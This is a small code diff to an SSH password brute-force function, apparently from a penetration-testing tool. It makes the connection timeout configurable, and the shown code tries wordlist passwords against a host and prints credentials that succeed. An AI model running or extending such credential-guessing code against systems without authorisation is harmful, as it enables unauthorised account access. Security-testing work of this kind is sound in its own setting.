@@ -4,7 +4,7 @@ from .utils import clear_line
 
 
 def ssh_bruteforce(
-    host: str, username: str, wordlist_path: str, port: int = 22
+    host: str, username: str, wordlist_path: str, port: int = 22, timeout: int = 3
 ) -> Optional[str]:
     """
     Attempt SSH brute force attack using a password wordlist.
@@ -32,7 +32,7 @@ def ssh_bruteforce(
                     port=port,
                     username=username,
                     password=password,
-                    timeout=3,
+                    timeout=timeout,
                 )
                 print(f"[+] SSH login succeeded: {username}:{password}")
                 return password
